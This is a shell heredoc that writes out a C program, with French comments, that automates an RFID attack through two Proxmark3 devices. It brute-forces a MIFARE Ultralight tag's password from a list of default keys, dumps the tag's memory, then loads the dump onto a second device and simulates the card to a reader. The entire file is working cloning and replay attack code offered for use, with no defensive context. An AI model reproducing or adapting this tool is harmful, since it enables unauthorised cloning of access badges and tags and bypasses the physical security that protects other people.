cat << 'EOF' > rejeu.c
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <process.h>

#define PROXY_PORT "COM9"
#define MOLE_PORT  "COM10"
#define PM3_PATH   "client\\proxmark3.exe"
#define BUFFER_SIZE 8192
#define LOG_FILE "pm3.log"
#define LOG_DIR "C:\\Users\\bourg\\Downloads\\ProxSpace\\ProxSpace\\pm3\\.proxmark3\\logs"


void start_proxy_sim(const char* uid) {
    char cmd[256];
    sprintf(cmd, "%s -p %s -c \"hf mfu sim -t 7\" ", PM3_PATH, PROXY_PORT);
    printf("[*] Lancement simulation sur PROXY (%s)...\n", PROXY_PORT);
    system(cmd); 
    printf("[*] Simulation active. Le Proxy attend le lecteur...\n");
}

int get_last_log_file(char *out, size_t size) {
    WIN32_FIND_DATAA ffd;
    HANDLE hFind;
    char search_path[MAX_PATH];

    snprintf(search_path, sizeof(search_path), "%s\\log_*.txt", LOG_DIR);

    hFind = FindFirstFileA(search_path, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return 0;
    }

    FILETIME latest = ffd.ftLastWriteTime;
    snprintf(out, size, "%s\\%s", LOG_DIR, ffd.cFileName);

    while (FindNextFileA(hFind, &ffd)) {
        if (CompareFileTime(&ffd.ftLastWriteTime, &latest) > 0) {
            latest = ffd.ftLastWriteTime;
            snprintf(out, size, "%s\\%s", LOG_DIR, ffd.cFileName);
        }
    }

    FindClose(hFind);
    return 1;
}

// Lit le contenu du dernier log
int get_last_log_content(char *buffer, size_t size) {
    char logfile[MAX_PATH];

    if (!get_last_log_file(logfile, sizeof(logfile))) {
        printf("[!] Aucun fichier log trouvé\n");
        return 0;
    }

    FILE *file = fopen(logfile, "r");
    if (!file) {
        perror("Erreur ouverture log");
        return 0;
    }

    fread(buffer, 1, size - 1, file);
    buffer[size - 1] = '\0';

    fclose(file);
    return 1;
}

void get_dump(){
    const char *passwords[] = {"00000000", "FFFFFFFF", "EEEEEEEE", "12345678", "87654321"};
    int num_passwords = sizeof(passwords) / sizeof(passwords[0]);

    char command[256];
    char log_content[BUFFER_SIZE];

    for (int i = 0; i < num_passwords; i++) {
        const char *pwd = passwords[i];

        printf("\n[*] TENTATIVE AVEC CLÉ : %s\n", pwd);

        // 1. Lancer la commande
        snprintf(command, sizeof(command),
                 "%s -p %s -c \"hf mfu dump -f mole_dump.bin -k %s\"", PM3_PATH, MOLE_PORT, pwd);
        system(command); 
                // 2. Attendre que le log soit écrit
        Sleep(2000);

        // 3. Lire le log
        if (!get_last_log_content(log_content, sizeof(log_content))) {
            continue;
        }
        // Vérification du contenu
        if (strstr(log_content, "Reading tag memory") && !strstr(log_content, "Failed")) {
            printf("\n[+] DÉTECTION LOG : Clé %s est VALIDE !\n", pwd);
            break;
        }
    }

}

void set_dump(){
    char command[256];
    printf("\n[*] Load du dump sur le proxy...\n");
    sprintf(command, "%s -p %s -c \"hf mfu eload -f mole_dump.bin\" ", PM3_PATH, PROXY_PORT);
    system(command); 
}

int main() {
    char uid[33] = {0};

    system("taskkill /IM proxmark3.exe /F >nul 2>&1");
    printf("=== RELAI ACTIF (FLAGS: -a -c) ===\n\n");

    get_dump();
    system("taskkill /IM proxmark3.exe /F >nul 2>&1");
    Sleep(1000);
    set_dump();
    start_proxy_sim(uid);
    

    return 0;


}
EOF